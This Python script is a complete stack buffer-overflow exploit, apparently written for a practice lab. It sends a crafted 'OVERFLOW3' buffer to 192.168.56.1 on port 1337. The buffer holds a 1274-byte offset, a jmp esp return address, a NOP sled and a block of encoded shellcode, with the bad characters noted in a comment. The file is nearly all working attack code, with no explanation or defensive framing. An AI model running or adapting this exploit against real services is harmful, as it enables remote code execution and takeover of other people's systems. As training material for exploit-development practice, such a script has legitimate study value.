#! /usr/bin/python3

import socket

IP = '192.168.56.1'
PORT = 1337

prefix = b'OVERFLOW3 '
offset = 1274
overflow = b'A' * offset
retn = b'\x03\x12\x50\x62'  #jmp esp 0x62501203
padding = b'\x90' * 32

#badchars \x00\x11\x40\x5f\xb8\xee

shellcode =  b'\xfc\xbb\x41\x36\xf6\xe3\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xbd\xde\x74\xe3\x3d\x1f\x19\x6d\xd8\x2e\x19\x09\xa9\x01\xa9\x59\xff\xad\x42\x0f\xeb\x26\x26\x98\x1c\x8e\x8d\xfe\x13\x0f\xbd\xc3\x32\x93\xbc\x17\x94\xaa\x0e\x6a\xd5\xeb\x73\x87\x87\xa4\xf8\x3a\x37\xc0\xb5\x86\xbc\x9a\x58\x8f\x21\x6a\x5a\xbe\xf4\xe0\x05\x60\xf7\x25\x3e\x29\xef\x2a\x7b\xe3\x84\x99\xf7\xf2\x4c\xd0\xf8\x59\xb1\xdc\x0a\xa3\xf6\xdb\xf4\xd6\x0e\x18\x88\xe0\xd5\x62\x56\x64\xcd\xc5\x1d\xde\x29\xf7\xf2\xb9\xba\xfb\xbf\xce\xe4\x1f\x41\x02\x9f\x24\xca\xa5\x4f\xad\x88\x81\x4b\xf5\x4b\xab\xca\x53\x3d\xd4\x0c\x3c\xe2\x70\x47\xd1\xf7\x08\x0a\xbe\x34\x21\xb4\x3e\x53\x32\xc7\x0c\xfc\xe8\x4f\x3d\x75\x37\x88\x42\xac\x8f\x06\xbd\x4f\xf0\x0f\x7a\x1b\xa0\x27\xab\x24\x2b\xb7\x54\xf1\xfc\xe7\xfa\xaa\xbc\x57\xbb\x1a\x55\xbd\x34\x44\x45\xbe\x9e\xed\xec\x45\x49\xd2\x59\x7d\xe3\xba\x9b\x7d\xf2\x81\x15\x9b\x9e\xe5\x73\x34\x37\x9f\xd9\xce\xa6\x60\xf4\xab\xe9\xeb\xfb\x4c\xa7\x1b\x71\x5e\x50\xec\xcc\x3c\xf7\xf3\xfa\x28\x9b\x66\x61\xa8\xd2\x9a\x3e\xff\xb3\x6d\x37\x95\x29\xd7\xe1\x8b\xb3\x81\xca\x0f\x68\x72\xd4\x8e\xfd\xce\xf2\x80\x3b\xce\xbe\xf4\x93\x99\x68\xa2\x55\x70\xdb\x1c\x0c\x2f\xb5\xc8\xc9\x03\x06\x8e\xd5\x49\xf0\x6e\x67\x24\x45\x91\x48\xa0\x41\xea\xb4\x50\xad\x21\x7d\x60\xe4\x6b\xd4\xe9\xa1\xfe\x64\x74\x52\xd5\xab\x81\xd1\xdf\x53\x76\xc9\xaa\x56\x32\x4d\x47\x2b\x2b\x38\x67\x98\x4c\x69\x67\x1e\xb3\x92'

payload = prefix + overflow + retn + padding + shellcode
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(3)
        s.connect((IP, PORT))
        print('Sending evil buffer...')
        s.send(payload)
        print('Done!')
except:
    print('Could not connect to remote host')